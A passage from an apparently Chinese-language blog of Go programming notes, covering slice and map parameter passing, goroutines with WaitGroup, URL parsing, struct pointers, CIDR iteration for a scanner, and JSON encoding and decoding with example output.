&amp;param1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">param1 address in main: <span class="number">0xc000010280</span>  </span><br><span class="line">param2 address in main: <span class="number">0xc00006a150</span></span><br><span class="line">param1 address in test: <span class="number">0xc000010290</span>    <span class="comment">// 字符串类型为值传递</span></span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span>    <span class="comment">// map类型为引用传递</span></span><br></pre></td></tr></table></figure>

<p>tips：slice比较特殊，若在子函数中修改切片的值，是可以修改父函数中切片的值，但若进行扩容操作，则不会同步到父函数切片中</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	param2 := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in main: %p\n&quot;</span>, param2)</span><br><span class="line">	test1(param2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in main: &quot;</span>, param2)</span><br><span class="line">	test2(param2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in main: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(param2 []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">	param2 = <span class="built_in">append</span>(param2, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in test1: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test2</span><span class="params">(param2 []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">	param2[<span class="number">0</span>] = <span class="string">&quot;e&quot;</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in test2: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">param2 address in main: <span class="number">0xc00006a150</span></span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span></span><br><span class="line">param2 in test1:  [a b c d]</span><br><span class="line">param2 in main:  [a b c]</span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span></span><br><span class="line">param2 in test2:  [e b c]</span><br><span class="line">param2 in main:  [e b c]</span><br></pre></td></tr></table></figure>

<p>究其原因，是由于slice为一个golang内置的一个结构体类型，传递slice的时候，这个结构体是值传递的，传递完成后，内存中有两个slice结构体，它们引用同一块slice数组</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// slice结构体定义</span></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">	array unsafe.Pointer</span><br><span class="line">	<span class="built_in">len</span>   <span class="type">int</span></span><br><span class="line">	<span class="built_in">cap</span>   <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当对切片内已有元素进行修改时，修改的是array指针指向的底层数据，但若进行扩容时，修改的是子函数结构体中的len以及cap，不会传递回父函数中</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6999653704433401887">https://juejin.cn/post/6999653704433401887</a></p>
<h2 id="2、golang协程"><a href="#2、golang协程" class="headerlink" title="2、golang协程"></a>2、golang协程</h2><p>golang内置了协程机制，使用关键字go即可</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> test1()   <span class="comment">// 使用协程运行子函数，但main函数没有阻塞，会继续向下走而导致程序退出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但若在main函数中只使用协程，可能协程运行的子函数还没运行完主程序推出了，故需要配合sync.WaitGroup来使用协程</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	s := sync.WaitGroup&#123;&#125;</span><br><span class="line">	s.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> test1(&amp;s)    <span class="comment">// 注意这里要传递指针  如果不使用指针类型就无法引用到同一个 WaitGroup变量，便也不能依赖 WaitGroup 来实现同步了</span></span><br><span class="line">	s.Wait()        <span class="comment">// wait会阻塞进程，等待waitgroup中所有协程执行完毕</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(s *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> s.Done()</span><br><span class="line">	fmt.Println(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>golang对sync.WaitGroup中的协程数量没有限制，如果短时间内创建大量协程可能会导致系统内存不够而程序异常退出，所以大部分场景下需要控制协程的数量</p>
<p>这里我习惯使用github.com&#x2F;remeh&#x2F;sizedwaitgroup这个第三方库来控制协程数量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	s := sizedwaitgroup.New(<span class="number">5</span>)   <span class="comment">// 限制协程数量，最多同时执行5个协程</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">20</span>; i++ &#123;</span><br><span class="line">		s.Add()</span><br><span class="line">		<span class="keyword">go</span> test1(&amp;s)</span><br><span class="line">	&#125;</span><br><span class="line">	s.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(s *sizedwaitgroup.SizedWaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> s.Done()</span><br><span class="line">	fmt.Println(time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">	time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ubuntu@test:~/$ <span class="keyword">go</span> run test.<span class="keyword">go</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br></pre></td></tr></table></figure>



<h2 id="3、系统性能显示"><a href="#3、系统性能显示" class="headerlink" title="3、系统性能显示"></a>3、系统性能显示</h2><p>我这里用github.com&#x2F;shirou&#x2F;gopsutil来显示当前系统cpu占用率 内存占用率</p>
<p>使用runtime来返回当前系统的cpu核数量，GOMAXPROCS设置最大可同时使用的cpu核数（自Go 1.5开始， Go的GOMAXPROCS默认值已经设置为CPU的核数），GOOS返回系统类型</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/126362239">https://zhuanlan.zhihu.com/p/126362239</a></p>
<h2 id="4、golang函数返回"><a href="#4、golang函数返回" class="headerlink" title="4、golang函数返回"></a>4、golang函数返回</h2><p>Go语言支持对返回值进行命名，这样返回值就和参数一样拥有参数变量名和类型</p>
<p>命名的返回值变量的默认值是类型的零值，如数值类型是0，字符串类型是空字符串，布尔类型是false、指针类型是nil等</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>) &#123;</span><br><span class="line">    a = <span class="number">1</span>    <span class="comment">// 函数声明时带有返回值变量a和b，因此可以在函数体中直接对函数返回值变量进行赋值  函数命名返回值和函数参数一样，也是函数的局部变量</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span>   <span class="comment">// 使用return隐式返回  </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时也可以下面这么写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同一种类型返回值和命名返回值两种形式只能二选一，混用时将会发生编译错误。例如下面的代码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>, <span class="type">int</span>)   </span><br></pre></td></tr></table></figure>



<h2 id="5、检查-amp-amp-解析url"><a href="#5、检查-amp-amp-解析url" class="headerlink" title="5、检查&amp;&amp;解析url"></a>5、检查&amp;&amp;解析url</h2><p>在解析url之前需要先检查一下url的格式是否正确</p>
<p>net&#x2F;url库虽然可以解析url，但没有提供检查格式是否正确</p>
<p>我使用github.com&#x2F;asaskevich&#x2F;govalidator来检查url格式，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/url&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/asaskevich/govalidator&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    host := <span class="string">&quot;postgres://user:pass@host.com:5432/path?k=v#f&quot;</span></span><br><span class="line">    isurl := govalidator.IsURL(host)     <span class="comment">// 检查url格式</span></span><br><span class="line">	<span class="keyword">if</span> isurl &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;host is right&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;host is error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	u, _ := url.Parse(host)</span><br><span class="line">    fmt.Println(u.Scheme)   <span class="comment">// 具体指访问服务器上的资源使用的哪种协议</span></span><br><span class="line">    fmt.Println(u.Host)     <span class="comment">// host或host:port，服务器地址，可以是 IP 地址，也可以是域名信息</span></span><br><span class="line">    fmt.Println(u.Path)     <span class="comment">// 路径，使用&quot;/&quot;分隔</span></span><br><span class="line">    fmt.Println(u.RawQuery) <span class="comment">// 编码后的查询字符串，没有&#x27;?&#x27;</span></span><br><span class="line">    m, _ := url.ParseQuery(u.RawQuery)</span><br><span class="line">	fmt.Println(m)</span><br><span class="line">	fmt.Println(m[<span class="string">&quot;k&quot;</span>][<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">host is right</span><br><span class="line">postgres</span><br><span class="line">host.com:<span class="number">5432</span></span><br><span class="line">/path</span><br><span class="line">k=v</span><br><span class="line"><span class="keyword">map</span>[k:[v]]</span><br><span class="line">v</span><br></pre></td></tr></table></figure>



<h2 id="6、结构体传参"><a href="#6、结构体传参" class="headerlink" title="6、结构体传参"></a>6、结构体传参</h2><p>golang中函数的传参是值的传递，那对于结构体来说呢？  下面进行一个实验</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newPerson 返回一个结构体变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson</span><span class="params">(name <span class="type">string</span>,age <span class="type">int</span>)</span></span> person&#123;</span><br><span class="line">	ret := person&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		age: age,</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 在创建结构体时，返回其内存地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>,&amp;ret)</span><br><span class="line">	<span class="keyword">return</span>  ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newPerson2 返回一个结构体指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson2</span><span class="params">(name <span class="type">string</span>,age <span class="type">int</span>)</span></span> *person&#123;</span><br><span class="line">	ret := &amp;person&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		age: age,</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 在创建结构体指针时，返回他储存的结构体的地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>,ret)</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    p1 := newPerson(<span class="string">&quot;张三&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;p1)</span><br><span class="line">    p2 := newPerson2(<span class="string">&quot;李四&quot;</span>, <span class="number">2</span>)<span class="keyword">go</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, p2)</span><br><span class="line">	    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson时，返回的结构体变量的地址</span></span><br><span class="line"><span class="number">0xc000096460</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson时，创建的结构体实例的地址</span></span><br><span class="line"><span class="number">0xc000096440</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson2时，返回的结构体指针的地址</span></span><br><span class="line"><span class="number">0xc0000964a0</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson2时，创建的结构体指针的地址</span></span><br><span class="line"><span class="number">0xc0000964a0</span></span><br></pre></td></tr></table></figure>

<p>如果构造函数返回的是一个结构体变量，在创建结构体实例时，是将构造函数中生成的结构体变量的值传给对应新创建的结构体变量，在上例字中对应的就是 p1，此时内存中就有值相同的两份结构体</p>
<p>如果构造函数返回的是一个结构体指针（newPerson2函数），构造函数最后是将该函数创建的结构体所对应的地址传给了我们创建的实例p2，注意，此时p2是一个结构体指针，这种创建方式，内存中只有一份结构体，对内存的消耗小</p>
<p>当程序很大时，如果都使用结构体传参而非结构体指针，则会产生很多不必要的内存开销，在开发过程中，尽量使用结构体指针来减少内存开销</p>
<h2 id="7、C段遍历"><a href="#7、C段遍历" class="headerlink" title="7、C段遍历"></a>7、C段遍历</h2><p>个人使用github.com&#x2F;3th1nk&#x2F;cidr库</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/3th1nk/cidr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cdir := <span class="keyword">range</span> r.target.Cdir &#123;</span><br><span class="line">		cdir, _:= cidr.ParseCIDR(cdir)</span><br><span class="line">		<span class="keyword">if</span> err := cdir.ForEachIP(<span class="function"><span class="keyword">func</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			r.wgscan.Add()</span><br><span class="line">			<span class="keyword">go</span> r.Scan(tempHost)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    		<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8、读取json文件"><a href="#8、读取json文件" class="headerlink" title="8、读取json文件"></a>8、读取json文件</h2><p>有时候需要读取json文件，这里需要用到json库的json.Unmarshal函数</p>
<p>tips：注意结构体需要成员首字母大写（只有导出的结构体成员才会被编码），首字母小写的结构体元素不会进行赋值</p>
<p>示例代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> portInfo <span class="keyword">struct</span> &#123; </span><br><span class="line">    Port      <span class="type">int</span> </span><br><span class="line">    Proto     <span class="type">string</span></span><br><span class="line">    Status    <span class="type">string</span> </span><br><span class="line">    Reason    <span class="type">string</span></span><br><span class="line">    Ttl       <span class="type">int</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ipInfo <span class="keyword">struct</span> &#123; </span><br><span class="line">    Ip        <span class="type">string</span> </span><br><span class="line">    Timestamp <span class="type">string</span> </span><br><span class="line">    Ports     []portInfo</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	url_file, err2 := os.Open(<span class="string">`test.log`</span>)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open input file error.&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> url_file.Close()</span><br><span class="line">	content, _ := ioutil.ReadAll(url_file)</span><br><span class="line">	content_trim := strings.Trim(<span class="type">string</span>(content), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> result []ipInfo</span><br><span class="line">	err := json.Unmarshal([]<span class="type">byte</span>(content_trim), &amp;result)    <span class="comment">// 通过unmarshal函数对result结构体进行赋值</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;json unmarshal error.&quot;</span>, err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(result[<span class="number">0</span>].Ip)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test.log文件</span><br><span class="line">[</span><br><span class="line">&#123;   <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;101.199.113.197&quot;</span>,   <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1618402120&quot;</span>, <span class="string">&quot;ports&quot;</span>: [ &#123;<span class="string">&quot;port&quot;</span>: <span class="number">80</span>, <span class="string">&quot;proto&quot;</span>: <span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;open&quot;</span>, <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;syn-ack&quot;</span>, <span class="string">&quot;ttl&quot;</span>: <span class="number">53</span>&#125; ] &#125;</span><br><span class="line">,</span><br><span class="line">&#123;   <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;101.199.113.197&quot;</span>,   <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1618402120&quot;</span>, <span class="string">&quot;ports&quot;</span>: [ &#123;<span class="string">&quot;port&quot;</span>: <span class="number">443</span>, <span class="string">&quot;proto&quot;</span>: <span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;open&quot;</span>, <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;syn-ack&quot;</span>, <span class="string">&quot;ttl&quot;</span>: <span class="number">52</span>&#125; ] &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="9、控制Go编码JSON数据时的行为"><a href="#9、控制Go编码JSON数据时的行为" class="headerlink" title="9、控制Go编码JSON数据时的行为"></a>9、控制Go编码JSON数据时的行为</h2><h4 id="1）自定义json键名"><a href="#1）自定义json键名" class="headerlink" title="1）自定义json键名"></a>1）自定义json键名</h4><p>在编码时，默认使用结构体字段的名字作为JSON对象中的key，如果想自定义键名，需要在结构体声明时在结构体字段标签里可以自定义对应的JSON key</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Address <span class="keyword">struct</span> &#123;</span><br><span class="line">    Type    <span class="type">string</span>  <span class="string">`json:&quot;type&quot;`</span></span><br><span class="line">    City    <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">    Country <span class="type">string</span>  <span class="string">`json:&quot;country&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-编码JSON时忽略掉指定字段"><a href="#2-编码JSON时忽略掉指定字段" class="headerlink" title="2) 编码JSON时忽略掉指定字段"></a>2) 编码JSON时忽略掉指定字段</h4><p>有时候不希望所有的结构体元素都被编码到json中传递给外部接口，所以一些私密字段我们希望能在编码中被忽略掉</p>
<p>一种方式是将结构体元素名首字母小写，但这样就只能在包内使用，但如果我们想让其他包能使用该字段，但又不被编码到json中呢？</p>
<p>解决办法还是使用json的注解，示例代码如下：</p>
